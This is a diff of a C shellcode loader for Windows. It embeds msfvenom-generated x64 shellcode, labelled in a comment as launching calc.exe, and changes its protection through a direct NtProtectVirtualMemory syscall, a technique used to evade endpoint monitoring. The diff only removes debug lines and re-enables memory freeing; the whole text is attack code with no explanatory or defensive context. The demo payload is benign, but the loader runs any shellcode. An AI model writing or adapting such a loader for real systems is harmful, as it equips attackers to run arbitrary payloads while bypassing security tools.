@@ -45,7 +45,8 @@ int main() {
     }
 
     printf("Base Address of VirtualAlloc: %p", baseAddress);
-    UINT64 egg = 0xffffffffffffffff;
+
+    // x64 calc.exe cmd from msfvenom
     unsigned char buf[] = 
         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
         "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -72,7 +73,6 @@ int main() {
 
     // Call the NtProtectVirtualMemory syscall from the assembly file
     ULONG oldProtect;
-    printf("\nBreak2");
     NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress,
                                              &regionSize, protect, &oldProtect, 0x50);
 
@@ -86,7 +86,7 @@ int main() {
     }
 
     // Free the allocated memory
-    //VirtualFree(baseAddress, 0, MEM_RELEASE);
+    VirtualFree(baseAddress, 0, MEM_RELEASE);
 
     while(true) {
 
